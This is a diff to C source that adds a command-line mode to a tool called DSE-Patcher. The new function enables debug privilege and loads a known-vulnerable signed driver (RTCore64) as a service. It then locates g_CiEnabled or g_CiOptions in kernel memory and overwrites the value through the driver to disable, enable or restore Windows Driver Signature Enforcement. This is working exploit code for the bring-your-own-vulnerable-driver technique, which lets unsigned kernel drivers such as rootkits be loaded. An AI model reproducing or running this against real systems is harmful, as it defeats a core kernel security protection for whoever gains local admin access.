@@ -2178,3 +2178,275 @@ cleanup:
 
     return rc;
 }
+
+
+//------------------------------------------------------------------------------
+// CLI execution function for command line mode
+//------------------------------------------------------------------------------
+int MyExecuteCLI(THREAD_TASK_NO ttno)
+{
+    int rc = 0;
+    int sel = 0; // default to first vulnerable driver (RTCore64)
+    HANDLE hDevice = NULL;
+
+    printf("DSE-Patcher CLI Mode\n");
+    printf("====================\n\n");
+
+    // enable debug privilege
+    printf("[*] Enabling required privileges...\n");
+    if(MyEnableDebugPrivilege() != 0)
+    {
+        printf("[!] Error: Could not enable SeDebugPrivilege!\n");
+        printf("[!] Please ensure the application is running as Administrator.\n");
+        return 1;
+    }
+
+    // get operating system version
+    printf("[*] Getting Windows version...\n");
+    OSVERSIONINFO osvi;
+    if(MyRtlGetVersion(&osvi) != 0)
+    {
+        printf("[!] Error: Can't retrieve operating system version!\n");
+        return 2;
+    }
+
+    // check for Windows Vista (build number 6000) or later
+    if(osvi.dwBuildNumber < 6000)
+    {
+        printf("[!] Error: DSE-Patcher requires Windows Vista or later!\n");
+        return 3;
+    }
+
+    // initialize vulnerable driver structures
+    if(MyInitVulnerableDrivers(g.vd,MAX_VULNERABLE_DRIVERS) != 0)
+    {
+        printf("[!] Error: Can't initialize vulnerable drivers!\n");
+        return 4;
+    }
+
+    // check for Windows Vista or Windows 7
+    if(osvi.dwBuildNumber < 9200)
+    {
+        printf("[*] Windows Vista or Windows 7 detected\n");
+
+        // fill patch data structure for Windows Vista and Windows 7
+        g.pd.szOS = "Windows Vista / Windows 7";
+        g.pd.szModuleName = "NTOSKRNL.EXE";
+        g.pd.szVariableName = "g_CiEnabled";
+        g.pd.dwDSEDisableValue = 0;
+        g.pd.dwDSEEnableValue = 1;
+        g.pd.dwPatchSize = 1;
+
+        printf("[*] Getting image base of NTOSKRNL.EXE...\n");
+
+        // get image base of module NTOSKRNL.EXE in kernel address space
+        if(MyGetImageBaseInKernelAddressSpace(g.pd.szModuleName,&g.pd.ui64ImageBase,&g.pd.ulImageSize) != 0)
+        {
+            printf("[!] Error: Can't get image base of NTOSKRNL.EXE!\n");
+            return 5;
+        }
+
+        printf("[*] Getting kernel address of g_CiEnabled...\n");
+
+        // get g_CiEnabled kernel address
+        if(MyGetg_CiEnabledKernelAddress(g.pd.ui64ImageBase,g.pd.ulImageSize,&g.pd.ui64PatchAddress) != 0)
+        {
+            printf("[!] Error: Can't get kernel address of g_CiEnabled!\n");
+            return 6;
+        }
+    }
+    else
+    {
+        printf("[*] Windows 8 or later detected\n");
+
+        // fill patch data structure for Windows 8 or later
+        g.pd.szOS = "Windows 8 or later";
+        g.pd.szModuleName = "CI.DLL";
+        g.pd.szVariableName = "g_CiOptions";
+        g.pd.dwDSEDisableValue = 0;
+        g.pd.dwDSEEnableValue = 6;
+        g.pd.dwPatchSize = 4;
+
+        printf("[*] Getting image base of CI.DLL...\n");
+
+        // get image base of module CI.DLL in kernel address space
+        if(MyGetImageBaseInKernelAddressSpace(g.pd.szModuleName,&g.pd.ui64ImageBase,&g.pd.ulImageSize) != 0)
+        {
+            printf("[!] Error: Can't get image base of CI.DLL!\n");
+            return 7;
+        }
+
+        printf("[*] Getting kernel address of g_CiOptions...\n");
+
+        // get g_CiOptions kernel address
+        if(MyGetg_CiOptionsKernelAddress(g.pd.ui64ImageBase,&g.pd.ui64PatchAddress,osvi.dwBuildNumber) != 0)
+        {
+            printf("[!] Error: Can't get kernel address of g_CiOptions!\n");
+            return 8;
+        }
+    }
+
+    printf("[+] Image Base: 0x%016I64X\n", g.pd.ui64ImageBase);
+    printf("[+] Image Size: 0x%08lX bytes\n", g.pd.ulImageSize);
+    printf("[+] Patch Address: 0x%016I64X\n", g.pd.ui64PatchAddress);
+
+    // check if the selected driver is supported on this Windows version
+    if(osvi.dwBuildNumber < g.vd[sel].dwMinSupportedBuildNumber || osvi.dwBuildNumber > g.vd[sel].dwMaxSupportedBuildNumber)
+    {
+        printf("[!] Warning: The selected driver may not be supported on this Windows version.\n");
+    }
+
+    printf("[*] Stopping and deleting existing service...\n");
+
+    // stop and delete service
+    if(g.vd[sel].pFunctionStopDriver(&g.vd[sel]) != 0)
+    {
+        printf("[!] Warning: Could not stop/delete existing service (may not exist).\n");
+    }
+
+    printf("[*] Creating and starting service...\n");
+
+    // create and start service
+    if(g.vd[sel].pFunctionStartDriver(&g.vd[sel]) != 0)
+    {
+        printf("[!] Error: Can't create and start service!\n");
+        return 9;
+    }
+
+    printf("[*] Opening driver device handle...\n");
+
+    // open driver device handle
+    //lint -e{1773} Warning 1773: Attempt to cast away const (or volatile)
+    if(g.vd[sel].pFunctionOpenDevice((char*)g.vd[sel].szDriverSymLink,&hDevice) != 0)
+    {
+        printf("[!] Error: Can't open driver device handle!\n");
+        rc = 10;
+        goto cleanup;
+    }
+
+    printf("[*] Reading current %s value...\n", g.pd.szVariableName);
+
+    // read DSE value
+    g.pd.dwDSEActualValue = 0xFFFFFFFF;
+    if(g.vd[sel].pFunctionReadMemory(hDevice,g.pd.ui64PatchAddress,g.pd.dwPatchSize,&g.pd.dwDSEActualValue) != 0)
+    {
+        printf("[!] Error: Can't read %s!\n", g.pd.szVariableName);
+        CloseHandle(hDevice);
+        rc = 11;
+        goto cleanup;
+    }
+
+    // store original value for restore operation
+    g.pd.dwDSEOriginalValue = g.pd.dwDSEActualValue;
+
+    if(g.pd.dwPatchSize == 1)
+    {
+        printf("[+] Current %s value: 0x%02lX\n", g.pd.szVariableName, g.pd.dwDSEActualValue);
+    }
+    else
+    {
+        printf("[+] Current %s value: 0x%08lX\n", g.pd.szVariableName, g.pd.dwDSEActualValue);
+    }
+
+    // perform the requested operation
+    if(ttno == ThreadTaskDisableDSE)
+    {
+        if(g.pd.dwDSEActualValue == 0)
+        {
+            printf("[*] DSE is already disabled.\n");
+        }
+        else
+        {
+            printf("[*] Disabling DSE...\n");
+
+            if(g.vd[sel].pFunctionWriteMemory(hDevice,g.pd.ui64PatchAddress,g.pd.dwPatchSize,g.pd.dwDSEDisableValue) != 0)
+            {
+                printf("[!] Error: Can't disable DSE!\n");
+                CloseHandle(hDevice);
+                rc = 12;
+                goto cleanup;
+            }
+
+            printf("[+] DSE disabled successfully!\n");
+        }
+    }
+    else if(ttno == ThreadTaskEnableDSE)
+    {
+        if(g.pd.dwDSEActualValue != 0)
+        {
+            printf("[*] DSE is already enabled.\n");
+        }
+        else
+        {
+            printf("[*] Enabling DSE...\n");
+
+            if(g.vd[sel].pFunctionWriteMemory(hDevice,g.pd.ui64PatchAddress,g.pd.dwPatchSize,g.pd.dwDSEEnableValue) != 0)
+            {
+                printf("[!] Error: Can't enable DSE!\n");
+                CloseHandle(hDevice);
+                rc = 13;
+                goto cleanup;
+            }
+
+            printf("[+] DSE enabled successfully!\n");
+        }
+    }
+    else if(ttno == ThreadTaskRestoreDSE)
+    {
+        printf("[*] Restoring DSE to original value...\n");
+
+        if(g.vd[sel].pFunctionWriteMemory(hDevice,g.pd.ui64PatchAddress,g.pd.dwPatchSize,g.pd.dwDSEOriginalValue) != 0)
+        {
+            printf("[!] Error: Can't restore DSE!\n");
+            CloseHandle(hDevice);
+            rc = 14;
+            goto cleanup;
+        }
+
+        printf("[+] DSE restored to original value successfully!\n");
+    }
+
+    // read and display new DSE value
+    g.pd.dwDSEActualValue = 0xFFFFFFFF;
+    if(g.vd[sel].pFunctionReadMemory(hDevice,g.pd.ui64PatchAddress,g.pd.dwPatchSize,&g.pd.dwDSEActualValue) != 0)
+    {
+        printf("[!] Warning: Could not verify new DSE value.\n");
+    }
+    else
+    {
+        if(g.pd.dwPatchSize == 1)
+        {
+            printf("[+] New %s value: 0x%02lX\n", g.pd.szVariableName, g.pd.dwDSEActualValue);
+        }
+        else
+        {
+            printf("[+] New %s value: 0x%08lX\n", g.pd.szVariableName, g.pd.dwDSEActualValue);
+        }
+
+        if(g.pd.dwDSEActualValue == 0)
+        {
+            printf("[+] DSE Status: DISABLED\n");
+        }
+        else
+        {
+            printf("[+] DSE Status: ENABLED\n");
+        }
+    }
+
+    // close device handle
+    CloseHandle(hDevice);
+
+cleanup:
+    printf("[*] Stopping and deleting service...\n");
+
+    // stop and delete service
+    if(g.vd[sel].szServiceName[0] != 0 && g.vd[sel].driverFile[0].szFilePath[0] != 0)
+    {
+        //lint -e{534} Warning 534: Ignoring return value of function
+        g.vd[sel].pFunctionStopDriver(&g.vd[sel]);
+    }
+
+    printf("[*] Done.\n");
+
+    return rc;
+}
